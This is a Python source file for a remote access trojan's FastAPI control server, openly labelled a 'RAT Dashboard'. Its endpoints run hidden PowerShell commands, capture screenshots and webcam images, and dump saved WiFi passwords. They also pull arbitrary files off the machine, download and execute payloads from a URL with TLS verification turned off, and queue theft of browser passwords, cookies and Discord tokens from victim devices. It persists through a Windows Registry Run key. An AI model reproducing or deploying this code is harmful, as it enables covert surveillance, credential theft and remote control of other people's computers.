"""
FastAPI Backend Server for RAT Control Dashboard
Replaces Discord Bot command interface with REST API endpoints
"""

from fastapi import FastAPI, HTTPException, UploadFile, File, WebSocket
from fastapi.responses import JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
import asyncio
import base64
import ctypes
import datetime
import io
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
import winreg
from typing import Optional, List, Dict
import psutil
import cv2
import pyaudio
import pyautogui
import requests
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from getpass import getuser
from shutil import copy2
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import ssl

# Initialize FastAPI app
app = FastAPI(title="RAT Dashboard API", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global state variables
screenlogger_enabled = False
connected_clients = []
devices = {}  # Store connected devices
command_queue = {}  # Store pending commands per device

# ==================== UTILITY FUNCTIONS ====================

def get_public_ip():
    """Fetch public IP address"""
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        return data['ip']
    except:
        return 'N/A'

def get_system_info_dict():
    """Get comprehensive system information"""
    try:
        system_name = socket.gethostname()
        public_ip = get_public_ip()
        system_ip = socket.gethostbyname(socket.gethostname())
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        os_info = subprocess.run(
            'powershell.exe systeminfo',
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
        
        return {
            "system_name": system_name,
            "public_ip": public_ip,
            "system_ip": system_ip,
            "platform": platform.system(),
            "python_version": sys.version,
            "os_info": os_info
        }
    except Exception as e:
        return {"error": str(e)}

def remove_startup_key():
    """Remove registry startup entry"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "MyStartupKey")
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_to_startup():
    """Add to Windows startup"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        executable_path = os.path.abspath(sys.executable)
        winreg.SetValueEx(key, "MyStartupKey", 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

# ==================== API ENDPOINTS ====================

@app.get("/api/status")
async def get_status():
    """Get RAT client status"""
    system_info = get_system_info_dict()
    return {
        "status": "online",
        "timestamp": datetime.datetime.now().isoformat(),
        "system_info": system_info
    }

@app.get("/api/system/info")
async def get_sysinfo():
    """Get detailed system information"""
    system_info = get_system_info_dict()
    return system_info

@app.post("/api/command/powershell")
async def execute_powershell(command: str):
    """Execute PowerShell command"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        output = subprocess.check_output(
            ["powershell", command],
            startupinfo=startupinfo,
            universal_newlines=True
        )
        
        return {
            "success": True,
            "output": output,
            "timestamp": datetime.datetime.now().isoformat()
        }
    except subprocess.CalledProcessError as e:
        return {
            "success": False,
            "error": f"Command failed with error code {e.returncode}",
            "output": str(e)
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/screenshot")
async def take_screenshot():
    """Take screenshot and return as base64"""
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        img_base64 = base64.b64encode(img_bytes.getvalue()).decode('utf-8')
        
        return {
            "success": True,
            "image": f"data:image/png;base64,{img_base64}",
            "timestamp": datetime.datetime.now().isoformat()
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/webcam/list")
async def list_webcams():
    """List available webcams"""
    try:
        devices = []
        for i in range(10):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                _, _ = cap.read()
                devices.append({"id": i, "name": f"Webcam {i}"})
                cap.release()
            else:
                break
        
        return {
            "success": True,
            "devices": devices
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/webcam/capture")
async def capture_webcam(device_id: int = 0):
    """Capture photo from webcam"""
    try:
        cap = cv2.VideoCapture(device_id)
        if not cap.isOpened():
            return {
                "success": False,
                "error": "Failed to open webcam"
            }
        
        ret, frame = cap.read()
        if not ret:
            return {
                "success": False,
                "error": "Failed to capture frame"
            }
        
        _, buffer = cv2.imencode('.jpg', frame)
        img_base64 = base64.b64encode(buffer.tobytes()).decode('utf-8')
        
        cap.release()
        
        return {
            "success": True,
            "image": f"data:image/jpeg;base64,{img_base64}",
            "timestamp": datetime.datetime.now().isoformat()
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/process/list")
async def list_processes():
    """List all running processes"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'status']):
            try:
                processes.append({
                    "pid": proc.info['pid'],
                    "name": proc.info['name'],
                    "status": proc.info['status']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        return {
            "success": True,
            "processes": processes,
            "total": len(processes)
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/process/kill")
async def kill_process(process_name: str):
    """Kill a process by name"""
    try:
        if sys.platform == 'win32':
            result = subprocess.run(
                ['taskkill', '/F', '/IM', process_name],
                capture_output=True
            )
        else:
            result = subprocess.run(
                ['killall', process_name],
                capture_output=True
            )
        
        if result.returncode == 0:
            return {
                "success": True,
                "message": f"Process '{process_name}' killed successfully"
            }
        else:
            return {
                "success": False,
                "error": result.stderr.decode().strip()
            }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/network/wifi")
async def get_wifi_passwords():
    """Get saved WiFi passwords"""
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profile'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        output = result.stdout
        
        profiles = [
            line.split(":")[1].strip()
            for line in output.splitlines()
            if "All User Profile" in line
        ]
        
        wifi_list = []
        
        for profile in profiles:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            profile_output = result.stdout
            
            if "Key Content" in profile_output:
                password_line = [
                    line.split(":")[1].strip()
                    for line in profile_output.splitlines()
                    if "Key Content" in line
                ]
                wifi_list.append({
                    "ssid": profile,
                    "password": password_line[0] if password_line else "N/A"
                })
        
        return {
            "success": True,
            "wifi_networks": wifi_list
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/system/shutdown")
async def system_shutdown():
    """Shutdown the system"""
    try:
        subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)
        return {
            "success": True,
            "message": "System shutdown initiated"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/system/restart")
async def system_restart():
    """Restart the system"""
    try:
        subprocess.run(["shutdown", "/r", "/t", "0"])
        return {
            "success": True,
            "message": "System restart initiated"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/file/download")
async def download_file(file_path: str):
    """Download a file from the system"""
    try:
        if not os.path.exists(file_path):
            return {
                "success": False,
                "error": "File not found"
            }
        
        return FileResponse(
            path=file_path,
            filename=os.path.basename(file_path)
        )
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/file/upload")
async def upload_file(file: UploadFile = File(...), destination: str = None):
    """Upload a file to the system"""
    try:
        if not destination:
            destination = os.path.expanduser(f"~/{file.filename}")
        
        content = await file.read()
        with open(destination, 'wb') as f:
            f.write(content)
        
        return {
            "success": True,
            "message": f"File uploaded to {destination}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/payload/execute")
async def execute_payload(url: str):
    """Download and execute a payload from URL"""
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        response = requests.get(url, verify=False)
        response.raise_for_status()
        content = response.content
        
        home_dir = os.path.expanduser("~")
        downloads_folder = os.path.join(home_dir, "Downloads")
        file_path = os.path.join(downloads_folder, filename)
        
        with open(file_path, 'wb') as f:
            f.write(content)
        
        # Execute the file
        command = f'start-process -FilePath "{file_path}"'
        subprocess.run(['powershell.exe', '-Command', command], shell=True)
        
        # Delete after 10 seconds
        await asyncio.sleep(10)
        os.remove(file_path)
        
        return {
            "success": True,
            "message": "Payload executed and cleaned up"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/logs")
async def get_logs(log_type: str = "system"):
    """Get system or application logs"""
    try:
        if log_type == "system":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            output = subprocess.check_output(
                ["powershell", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"],
                startupinfo=startupinfo,
                universal_newlines=True
            )
            
            return {
                "success": True,
                "logs": output
            }
        else:
            return {
                "success": False,
                "error": "Invalid log type"
            }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.post("/api/screenlogger/toggle")
async def toggle_screenlogger(enable: bool):
    """Enable or disable screenlogger"""
    global screenlogger_enabled
    
    try:
        screenlogger_enabled = enable
        return {
            "success": True,
            "screenlogger_enabled": screenlogger_enabled,
            "message": f"Screenlogger {'enabled' if enable else 'disabled'}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/screenlogger/status")
async def get_screenlogger_status():
    """Get screenlogger status"""
    return {
        "screenlogger_enabled": screenlogger_enabled
    }

@app.post("/api/command/grab_passwords")
async def grab_passwords():
    """Grab browser passwords - queue command to client"""
    try:
        # Get first connected device
        if not devices:
            raise HTTPException(status_code=400, detail="No connected devices")
        
        device_id = list(devices.keys())[0]
        
        # Queue command
        command = {
            "type": "grab_passwords",
            "params": {}
        }
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        
        cmd = {
            "id": str(datetime.datetime.now().timestamp()),
            **command
        }
        command_queue[device_id].append(cmd)
        
        # In production, wait for result from client
        # For now, return immediate message
        return {
            "success": True,
            "message": "Command queued",
            "status": "pending"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command/grab_cookies")
async def grab_cookies():
    """Grab browser cookies - queue command to client"""
    try:
        if not devices:
            raise HTTPException(status_code=400, detail="No connected devices")
        
        device_id = list(devices.keys())[0]
        
        command = {
            "type": "grab_cookies",
            "params": {}
        }
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        
        cmd = {
            "id": str(datetime.datetime.now().timestamp()),
            **command
        }
        command_queue[device_id].append(cmd)
        
        return {
            "success": True,
            "message": "Command queued",
            "status": "pending"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command/grab_distoken")
async def grab_distoken():
    """Grab Discord tokens - queue command to client"""
    try:
        if not devices:
            raise HTTPException(status_code=400, detail="No connected devices")
        
        device_id = list(devices.keys())[0]
        
        command = {
            "type": "grab_distoken",
            "params": {}
        }
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        
        cmd = {
            "id": str(datetime.datetime.now().timestamp()),
            **command
        }
        command_queue[device_id].append(cmd)
        
        return {
            "success": True,
            "message": "Command queued",
            "status": "pending"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs")
async def get_logs():
    """Get system logs"""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        result = subprocess.run(
            ['powershell', 'Get-WinEvent -LogName System -MaxEvents 50 | Select-Object -Property TimeCreated, Message'],
            capture_output=True,
            text=True,
            startupinfo=startupinfo
        )
        
        return {
            "success": True,
            "logs": result.stdout
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/ping")
async def ping():
    """Ping endpoint to check if client is alive"""
    return {
        "success": True,
        "latency_ms": 0,
        "timestamp": datetime.datetime.now().isoformat()
    }

# ==================== DEVICE MANAGEMENT ====================

@app.post("/api/device/register")
async def register_device(data: dict):
    """Register a new device/client"""
    try:
        device_id = data.get('device_id')
        if not device_id:
            raise HTTPException(status_code=400, detail="device_id required")
        
        devices[device_id] = {
            **data,
            'registered_at': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat()
        }
        
        if device_id not in command_queue:
            command_queue[device_id] = []
        
        return {
            "status": "success",
            "message": f"Device {device_id} registered",
            "device_id": device_id
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/devices")
async def list_devices():
    """List all connected devices"""
    return {
        "devices": list(devices.values()),
        "count": len(devices)
    }

@app.get("/api/device/{device_id}")
async def get_device(device_id: str):
    """Get device information"""
    if device_id not in devices:
        raise HTTPException(status_code=404, detail="Device not found")
    
    return devices[device_id]

# ==================== COMMAND QUEUE ====================

@app.post("/api/commands/{device_id}")
async def send_command(device_id: str, command: dict):
    """Send command to device"""
    try:
        if device_id not in devices:
            raise HTTPException(status_code=404, detail="Device not found")
        
        # Add command to queue
        cmd = {
            "id": str(datetime.datetime.now().timestamp()),
            **command
        }
        command_queue[device_id].append(cmd)
        
        return {
            "status": "success",
            "command_id": cmd["id"],
            "message": f"Command queued for {device_id}"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/commands/pending/{device_id}")
async def get_pending_commands(device_id: str):
    """Get pending commands for a device"""
    try:
        if device_id not in devices:
            raise HTTPException(status_code=404, detail="Device not found")
        
        pending = command_queue.get(device_id, [])
        command_queue[device_id] = []  # Clear queue after retrieving
        
        # Update last seen
        devices[device_id]['last_seen'] = datetime.datetime.now().isoformat()
        
        return pending
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/commands/{command_id}/result")
async def report_command_result(command_id: str, result: dict):
    """Report command execution result"""
    try:
        # Store result (in production, save to database)
        return {
            "status": "success",
            "message": f"Result received for command {command_id}"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Health check endpoint
@app.get("/health")
async def health():
    """Health check endpoint"""
    return {"status": "healthy"}

if __name__ == "__main__":
    import uvicorn
    # Remove startup key on start
    remove_startup_key()
    try:
        add_to_startup()
    except PermissionError:
        pass
    
    uvicorn.run(app, host="127.0.0.1", port=8000)
